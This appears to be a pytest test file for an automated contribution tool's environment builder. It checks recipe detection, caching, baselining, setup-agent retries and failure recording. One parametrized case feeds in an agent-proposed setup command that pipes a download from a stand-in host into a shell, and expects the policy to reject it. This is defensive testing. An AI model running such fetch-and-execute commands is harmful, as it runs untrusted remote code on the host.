from __future__ import annotations

import os
import sqlite3
import subprocess
from collections.abc import Callable
from pathlib import Path
from typing import Any, ClassVar

import pytest

import autocontribute.environment_builder as environment_builder
from autocontribute.config import EnvironmentOverride, SandboxConfig
from autocontribute.environment_builder import EnvironmentBuilder, FailedAttempt
from autocontribute.environment_setup import EnvironmentImage
from autocontribute.environment_signals import RepositorySignals
from autocontribute.environments import EnvironmentBaseline, EnvironmentRecipe
from autocontribute.exceptions import (
    EnvironmentRecipeError,
    EnvironmentSetupError,
    EnvironmentUnavailable,
    RepositoryError,
    SandboxError,
)
from autocontribute.repository import RepositoryWorkspace
from autocontribute.sandbox import ImageIdentity
from autocontribute.store import RunStore
from autocontribute.suite_results import CaseResult
from autocontribute.suite_runs import SuiteRun, summarize_baseline

_BASE = ImageIdentity("sha256:" + "1" * 64, "sha256:" + "2" * 64, {}, "linux/arm64")


def _git(directory: Path, *arguments: str) -> str:
    completed = subprocess.run(
        ["git", "-c", "user.name=F", "-c", "user.email=f@example.invalid", *arguments],
        cwd=directory,
        capture_output=True,
        text=True,
        check=True,
        env={**os.environ, "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_NOSYSTEM": "1"},
    )
    return completed.stdout.strip()


@pytest.fixture
def workspace(tmp_path: Path) -> RepositoryWorkspace:
    source = tmp_path / "source"
    (source / "tests").mkdir(parents=True)
    (source / "pyproject.toml").write_text(
        '[project]\nname = "demo"\nrequires-python = ">=3.11"\n'
        '[dependency-groups]\ntest = ["pytest"]\n',
        encoding="utf-8",
    )
    (source / ".gitignore").write_text("build/\n", encoding="utf-8")
    (source / "tests" / "test_demo.py").write_text("def test_ok(): pass\n", encoding="utf-8")
    _git(source, "init", "-q")
    _git(source, "add", ".")
    _git(source, "commit", "-qm", "base")
    run_directory = tmp_path / "state" / "workspaces" / "run1"
    run_directory.mkdir(parents=True)
    return RepositoryWorkspace.clone(
        str(source), _git(source, "rev-parse", "HEAD"), run_directory / "W", allow_local_source=True
    )


def _suite(passed: int, failed: int = 0, *, output: str = "") -> SuiteRun:
    results = {f"t{n}": CaseResult(f"t{n}", "passed", 0.1, "") for n in range(passed)}
    results.update({f"f{n}": CaseResult(f"f{n}", "failed", 0.1, "boom") for n in range(failed)})
    return SuiteRun(1 if failed else 0, False, 2.0, results, True, None, output)


def _timed_out() -> SuiteRun:
    return SuiteRun(124, True, 900.0, {}, True, None, "watching for file changes")


class _FakeSetup:
    """Scripted environment setup that records what it was asked to do."""

    instances: ClassVar[list[_FakeSetup]] = []
    reusable: ClassVar[bool] = False
    # Raised by build for recipes whose first setup command is a key here.
    failures: ClassVar[dict[str, EnvironmentSetupError | SandboxError]] = {}
    dirty: ClassVar[list[str]] = []

    def __init__(self, config: SandboxConfig, **options: Any) -> None:
        self.options = options
        self.reused: list[EnvironmentRecipe] = []
        self.built: list[tuple[EnvironmentRecipe, dict[str, Any]]] = []
        _FakeSetup.instances.append(self)

    def reuse(
        self, workspace: RepositoryWorkspace, recipe: EnvironmentRecipe, **options: Any
    ) -> EnvironmentImage | None:
        self.reused.append(recipe)
        if not _FakeSetup.reusable:
            return None
        return EnvironmentImage("sha256:" + "4" * 64, "tag", recipe.base_image, "d", "k", True)

    def build(
        self, workspace: RepositoryWorkspace, recipe: EnvironmentRecipe, **options: Any
    ) -> tuple[EnvironmentImage, EnvironmentRecipe]:
        self.built.append((recipe, options))
        (workspace.path / "build").mkdir(exist_ok=True)
        (workspace.path / "build" / f"{recipe.source}.txt").write_text("output", encoding="utf-8")
        failure = _FakeSetup.failures.get(recipe.setup_commands[0])
        if failure is not None:
            raise failure
        image = EnvironmentImage(
            "sha256:" + "3" * 64, "tag", recipe.base_image, _BASE.digest, "key", False
        )
        return image, recipe.model_copy(update={"setup_dirty_paths": list(_FakeSetup.dirty)})


class _Agent:
    def __init__(self, recipe: Callable[[EnvironmentRecipe], EnvironmentRecipe] | None) -> None:
        self.recipe = recipe
        self.calls: list[tuple[RepositorySignals, FailedAttempt]] = []

    def propose_recipe(
        self, signals: RepositorySignals, failed: FailedAttempt
    ) -> EnvironmentRecipe | None:
        self.calls.append((signals, failed))
        return None if self.recipe is None else self.recipe(failed.recipe)


@pytest.fixture
def harness(monkeypatch: pytest.MonkeyPatch) -> dict[str, list[Any]]:
    _FakeSetup.instances = []
    _FakeSetup.reusable = False
    _FakeSetup.failures = {}
    _FakeSetup.dirty = []
    recorded: dict[str, list[Any]] = {
        "pulls": [],
        "baselines": [],
        "suites": [],
        "missing_images": [],
    }

    def pull(reference: str, **_options: Any) -> ImageIdentity:
        recorded["pulls"].append(reference)
        if reference in recorded["missing_images"]:
            raise SandboxError(f"Could not pull image {reference}: not found")
        return _BASE

    def baseline(
        _config: SandboxConfig, *, snapshot: Path, base_sha: str, **options: Any
    ) -> tuple[EnvironmentBaseline, tuple[SuiteRun, ...]]:
        built = sorted(path.name for path in (snapshot / "build").iterdir())
        recorded["baselines"].append((snapshot, built))
        runs = recorded["suites"].pop(0) if recorded["suites"] else [_suite(10), _suite(10)]
        return summarize_baseline(runs, base_sha=base_sha), tuple(runs)

    monkeypatch.setattr(environment_builder, "EnvironmentSetup", _FakeSetup)
    monkeypatch.setattr(environment_builder, "detect_docker_daemon_mode", lambda *_: "rootful")
    monkeypatch.setattr(environment_builder, "pull_image", pull)
    monkeypatch.setattr(environment_builder, "run_baseline", baseline)
    return recorded


def _builder(tmp_path: Path) -> tuple[EnvironmentBuilder, RunStore]:
    store = RunStore(tmp_path / "state")
    return EnvironmentBuilder(SandboxConfig(), store, run_id="run1"), store


def test_a_detected_recipe_is_built_baselined_and_cached(
    tmp_path: Path, workspace: RepositoryWorkspace, harness: dict[str, list[Any]]
) -> None:
    builder, store = _builder(tmp_path)

    prepared = builder.prepare("acme/demo", workspace, None, None)

    setup = _FakeSetup.instances[0]
    recipe, options = setup.built[0]
    assert recipe.source == "detected" and recipe.language == "python"
    assert options["distribution"] == "demo"
    assert options["allow_hosts"] == ()
    assert setup.reused == [recipe]
    assert prepared.snapshot == workspace.path.with_name("W.snapshot")
    assert harness["baselines"] == [(prepared.snapshot, ["detected.txt"])]
    assert prepared.baseline.pass_stable == [f"t{n}" for n in range(10)]
    stored = store.environment("acme/demo")
    assert stored is not None and stored.status == "ok" and stored.recipe == prepared.recipe
    assert stored.cache_key is not None and stored.baseline == prepared.baseline


def test_a_cached_recipe_with_a_matching_key_is_tried_first(
    tmp_path: Path, workspace: RepositoryWorkspace, harness: dict[str, list[Any]]
) -> None:
    builder, store = _builder(tmp_path)
    first = builder.prepare("acme/demo", workspace, None, None)
    stored = store.environment("acme/demo")
    assert stored is not None
    _FakeSetup.reusable = True

    again = EnvironmentBuilder(SandboxConfig(), store, run_id="run1").prepare(
        "acme/demo", workspace, None, None
    )

    assert again.recipe.source == "cached"
    assert again.image.reused
    assert again.recipe.test_command == first.recipe.test_command
    assert harness["pulls"].count(first.recipe.base_image) == 2

    with sqlite3.connect(store.database_path) as connection:
        connection.execute("UPDATE environment_recipes SET cache_key = ?", ("e" * 64,))
    other = EnvironmentBuilder(SandboxConfig(), store, run_id="run1").prepare(
        "acme/demo", workspace, None, None
    )
    assert other.recipe.source == "detected"


def test_a_recent_failure_blocks_the_repository_unless_the_config_overrides_it(
    tmp_path: Path, workspace: RepositoryWorkspace, harness: dict[str, list[Any]]
) -> None:
    builder, store = _builder(tmp_path)
    store.mark_environment_failed("acme/demo", reason="only 1 of 9 tests passed")

    with pytest.raises(EnvironmentUnavailable, match="failed in the last 7 days"):
        builder.prepare("acme/demo", workspace, None, None)
    assert _FakeSetup.instances[0].built == []

    override = EnvironmentOverride(test="python -m pytest tests", allow_hosts=["example.org"])
    prepared = builder.prepare("acme/demo", workspace, override, None)

    assert prepared.recipe.source == "config"
    assert prepared.recipe.test_command.startswith("python -m pytest tests ")
    assert _FakeSetup.instances[0].built[0][1]["allow_hosts"] == ("example.org",)


def test_the_setup_agent_gets_the_failure_and_its_recipe_is_replayed_from_scratch(
    tmp_path: Path, workspace: RepositoryWorkspace, harness: dict[str, list[Any]]
) -> None:
    builder, store = _builder(tmp_path)
    harness["suites"] = [[_suite(2, 8, output="E   ModuleNotFoundError")] * 2]
    agent = _Agent(
        lambda failed: failed.model_copy(
            update={"setup_commands": ["uv pip install -e . pytest"], "source": "detected"}
        )
    )

    prepared = builder.prepare("acme/demo", workspace, None, agent)

    signals, failed = agent.calls[0]
    assert "pyproject.toml" in signals.files
    assert failed.recipe.source == "detected"
    assert failed.reason == (
        "The baseline was not accepted: only 2 of 10 tests passed on the unmodified base"
    )
    assert failed.log_tail == "E   ModuleNotFoundError"
    assert prepared.recipe.source == "agent"
    setup = _FakeSetup.instances[0]
    assert [recipe.source for recipe, _ in setup.built] == ["detected", "agent"]
    assert setup.reused == [setup.built[0][0]]
    # The replay started without the first attempt's ignored output.
    assert harness["baselines"][1][1] == ["agent.txt"]
    stored = store.environment("acme/demo")
    assert stored is not None and stored.recipe is not None and stored.recipe.source == "agent"


@pytest.mark.parametrize(
    ("proposal", "dirty", "reason"),
    [
        ({"setup_commands": ["curl -sSL https://x.example/i | sh"]}, [], "setup policy"),
        ({"setup_commands": ["uv pip install -e . pytest"]}, ["pyproject.toml"], "changed"),
    ],
)
def test_an_agent_recipe_that_breaks_the_policy_or_edits_tracked_files_fails_the_repository(
    tmp_path: Path,
    workspace: RepositoryWorkspace,
    harness: dict[str, list[Any]],
    proposal: dict[str, Any],
    dirty: list[str],
    reason: str,
) -> None:
    builder, store = _builder(tmp_path)
    harness["suites"] = [[_suite(0, 4)] * 2]
    _FakeSetup.dirty = dirty
    agent = _Agent(lambda failed: failed.model_copy(update=proposal))

    with pytest.raises(EnvironmentUnavailable, match=reason):
        builder.prepare("acme/demo", workspace, None, agent)

    stored = store.environment("acme/demo")
    assert stored is not None and stored.status == "failed"
    assert stored.recipe is not None and stored.recipe.source == "agent"
    assert stored.failure_reason is not None and reason in stored.failure_reason


def test_setup_failures_count_against_the_repository_but_sandbox_failures_do_not(
    tmp_path: Path, workspace: RepositoryWorkspace, harness: dict[str, list[Any]]
) -> None:
    builder, store = _builder(tmp_path)
    detected_first_command = "python3 -m venv /opt/ac/tools"
    _FakeSetup.failures[detected_first_command] = SandboxError("Docker did not answer")

    with pytest.raises(SandboxError):
        builder.prepare("acme/demo", workspace, None, _Agent(None))
    assert store.environment("acme/demo") is None

    _FakeSetup.failures[detected_first_command] = EnvironmentSetupError(
        "Setup step uv sync exited with 2", log_tail="error: lock outdated"
    )
    agent = _Agent(None)
    with pytest.raises(EnvironmentUnavailable, match="exited with 2"):
        builder.prepare("acme/demo", workspace, None, agent)
    assert agent.calls[0][1].log_tail == "error: lock outdated"
    assert store.environment_block("acme/demo") == "Setup step uv sync exited with 2"


def test_a_repository_without_a_supported_project_is_recorded_as_failed(
    tmp_path: Path, harness: dict[str, list[Any]]
) -> None:
    source = tmp_path / "plain"
    source.mkdir()
    (source / "README").write_text("docs only\n", encoding="utf-8")
    _git(source, "init", "-q")
    _git(source, "add", ".")
    _git(source, "commit", "-qm", "base")
    plain = RepositoryWorkspace.clone(
        str(source), _git(source, "rev-parse", "HEAD"), tmp_path / "P", allow_local_source=True
    )
    builder, store = _builder(tmp_path)

    with pytest.raises(EnvironmentUnavailable, match="No Python, JavaScript, Go or Rust"):
        builder.prepare("acme/plain", plain, None, _Agent(None))

    assert store.environment_block("acme/plain") is not None


def test_a_test_command_that_never_finishes_is_not_cached(
    tmp_path: Path, workspace: RepositoryWorkspace, harness: dict[str, list[Any]]
) -> None:
    # A watch-mode runner or a server the tests start looks like a slow suite: it collects
    # nothing, so the recipe must not be replayed as a working one.
    builder, store = _builder(tmp_path)
    harness["suites"] = [[_timed_out()]]
    agent = _Agent(None)

    with pytest.raises(EnvironmentUnavailable, match="did not finish within 900 s"):
        builder.prepare("acme/demo", workspace, None, agent)

    assert agent.calls[0][1].log_tail == "watching for file changes"
    stored = store.environment("acme/demo")
    assert stored is not None and stored.status == "failed" and stored.baseline is None


def test_a_base_image_that_cannot_be_pulled_fails_the_repository(
    tmp_path: Path, workspace: RepositoryWorkspace, harness: dict[str, list[Any]]
) -> None:
    builder, store = _builder(tmp_path)
    harness["missing_images"] = ["python:3.14-bookworm"]

    with pytest.raises(EnvironmentUnavailable, match=r"Could not pull image python:3\.14"):
        builder.prepare("acme/demo", workspace, None, None)

    assert _FakeSetup.instances[0].built == []
    assert store.environment_block("acme/demo") is not None


def _cache_working_recipe(
    tmp_path: Path, workspace: RepositoryWorkspace, **changes: Any
) -> tuple[RunStore, EnvironmentRecipe]:
    """Prepare once so the store holds a working recipe, changed as asked under its key."""

    builder, store = _builder(tmp_path)
    builder.prepare("acme/demo", workspace, None, None)
    stored = store.environment("acme/demo")
    assert stored is not None and stored.recipe is not None and stored.baseline is not None
    assert stored.cache_key is not None
    recipe = stored.recipe.model_copy(update=changes)
    store.save_environment(recipe, cache_key=stored.cache_key, baseline=stored.baseline)
    _FakeSetup.instances = []
    return store, recipe


def test_a_failed_cached_recipe_is_not_rebuilt_when_detection_finds_the_same(
    tmp_path: Path, workspace: RepositoryWorkspace, harness: dict[str, list[Any]]
) -> None:
    store, recipe = _cache_working_recipe(tmp_path, workspace)
    _FakeSetup.failures[recipe.setup_commands[0]] = EnvironmentSetupError(
        "Setup step uv sync exited with 1", log_tail="error: lock outdated"
    )
    agent = _Agent(None)

    with pytest.raises(EnvironmentUnavailable, match="exited with 1"):
        EnvironmentBuilder(SandboxConfig(), store, run_id="run1").prepare(
            "acme/demo", workspace, None, agent
        )

    assert [built.source for built, _ in _FakeSetup.instances[0].built] == ["cached"]
    assert agent.calls[0][1].recipe.source == "cached"


def test_a_different_detected_recipe_is_replayed_on_a_clean_tree(
    tmp_path: Path, workspace: RepositoryWorkspace, harness: dict[str, list[Any]]
) -> None:
    store, _ = _cache_working_recipe(tmp_path, workspace, setup_commands=["uv sync --frozen"])
    _FakeSetup.failures["uv sync --frozen"] = EnvironmentSetupError("Setup step exited with 2")
    (workspace.path / "README.md").write_text("left by the failed attempt\n", encoding="utf-8")

    prepared = EnvironmentBuilder(SandboxConfig(), store, run_id="run1").prepare(
        "acme/demo", workspace, None, None
    )

    assert prepared.recipe.source == "detected"
    assert [built.source for built, _ in _FakeSetup.instances[0].built] == ["cached", "detected"]
    # The detected build saw neither the cached attempt's ignored output nor its new file.
    assert harness["baselines"][-1][1] == ["detected.txt"]
    assert not (workspace.path / "README.md").exists()


def test_the_setup_agent_gets_a_cached_failure_when_detection_finds_nothing(
    tmp_path: Path,
    workspace: RepositoryWorkspace,
    harness: dict[str, list[Any]],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    store, recipe = _cache_working_recipe(tmp_path, workspace)
    _FakeSetup.failures[recipe.setup_commands[0]] = EnvironmentSetupError("Setup step failed")

    def no_project(*_arguments: object) -> EnvironmentRecipe:
        raise EnvironmentRecipeError("No Python, JavaScript, Go or Rust project")

    monkeypatch.setattr(environment_builder, "detect_recipe", no_project)
    agent = _Agent(
        lambda failed: failed.model_copy(update={"setup_commands": ["uv pip install -e ."]})
    )

    prepared = EnvironmentBuilder(SandboxConfig(), store, run_id="run1").prepare(
        "acme/demo", workspace, None, agent
    )

    assert agent.calls[0][1].recipe.source == "cached"
    assert agent.calls[0][1].reason == "Setup step failed"
    assert prepared.recipe.source == "agent"


def test_an_earlier_attempt_that_cannot_be_undone_fails_the_repository(
    tmp_path: Path,
    workspace: RepositoryWorkspace,
    harness: dict[str, list[Any]],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    builder, store = _builder(tmp_path)
    harness["suites"] = [[_suite(0, 4)] * 2]

    def stuck(_workspace: RepositoryWorkspace) -> list[str]:
        raise RepositoryError("Could not delete nested: Operation not permitted")

    monkeypatch.setattr(RepositoryWorkspace, "restore_base", stuck)
    agent = _Agent(lambda failed: failed.model_copy(update={"setup_commands": ["uv sync"]}))

    with pytest.raises(EnvironmentUnavailable, match="cannot be undone"):
        builder.prepare("acme/demo", workspace, None, agent)

    assert store.environment_block("acme/demo") is not None
